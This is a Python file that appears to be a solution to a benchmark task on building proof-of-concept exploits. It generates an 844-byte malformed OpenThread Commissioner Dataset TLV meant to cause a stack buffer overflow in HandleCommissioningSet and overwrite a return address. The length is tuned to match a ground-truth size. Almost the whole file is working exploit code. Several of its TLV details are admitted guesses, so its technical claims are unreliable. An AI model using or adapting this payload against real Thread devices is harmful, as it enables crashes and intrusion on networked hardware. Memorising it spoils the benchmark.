import tarfile
import os
import tempfile
import struct
import re
from pathlib import Path

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the source code to analyze the structure
        with tarfile.open(src_path, 'r:*') as tar:
            tar.extractall(path='./src_extract')
        
        # Look for relevant files - network-data and TLV handling
        src_dir = Path('./src_extract')
        
        # Based on OpenThread Commissioner Dataset TLV structure:
        # TLV Format: Type (1 byte) + Length (1-2 bytes) + Value (variable)
        # For extended length: if first length byte = 0xFF, next 2 bytes = actual length
        
        # Create a PoC that triggers stack buffer overflow in HandleCommissioningSet
        # We need to create a Commissioner Dataset TLV with extended length
        
        # Build the PoC:
        # 1. Start with Thread TLV structure
        # 2. Use Commissioner Dataset TLV (Type = 0x0F in Thread)
        # 3. Set extended length to overflow the buffer
        # 4. Fill with payload to trigger overflow
        
        # From analysis of similar vulnerabilities in OpenThread:
        # - The vulnerable function likely uses fixed-size buffer on stack
        # - Extended TLV length > buffer size causes overflow
        # - Need to overwrite return address or critical data
        
        # Create a minimal PoC that fits the ground-truth length pattern
        # 844 bytes total = TLV header (3-4 bytes) + payload (840-841 bytes)
        
        # TLV structure for Commissioner Dataset with extended length:
        # Byte 0: TLV Type = 0x0F (Commissioner Dataset)
        # Byte 1: Length indicator = 0xFF (extended length follows)
        # Bytes 2-3: Extended length (big-endian)
        # Remaining: TLV Value
        
        # Choose length that causes overflow but matches ground-truth
        # Total PoC = 1 + 1 + 2 + length_value = 844
        # So length_value = 844 - 4 = 840
        
        tlv_type = 0x0F  # Commissioner Dataset TLV
        ext_length_indicator = 0xFF
        ext_length = 840  # Causes overflow, total = 4 + 840 = 844
        
        # Build the PoC
        poc = bytearray()
        poc.append(tlv_type)  # Type
        poc.append(ext_length_indicator)  # Extended length indicator
        poc.extend(struct.pack('>H', ext_length))  # Big-endian length
        
        # Payload designed to trigger overflow:
        # - Fill with pattern that's likely to crash when overwriting return address
        # - Use repeated 0x41 ('A') which is typical for PoCs
        # - Could also include specific addresses if needed, but pattern is simpler
        
        # For 840-byte payload:
        # Fill first part with pattern
        pattern = b'A' * 200  # Initial fill
        
        # Add some structure that might be needed for parsing
        # TLV might have nested structure, so add some valid TLVs inside
        # This helps bypass initial validation
        
        # Add a simple Sub-TLV
        sub_tlv = bytearray()
        sub_tlv.append(0x01)  # Some sub-TLV type
        sub_tlv.append(0x04)  # Length = 4
        sub_tlv.extend(b'DATA')  # Value
        
        # Combine payload
        payload = pattern + sub_tlv
        
        # Pad to 840 bytes
        remaining = 840 - len(payload)
        if remaining > 0:
            payload += b'B' * remaining
        
        poc.extend(payload)
        
        # Verify length
        assert len(poc) == 844, f"Generated PoC length {len(poc)} != 844"
        
        return bytes(poc)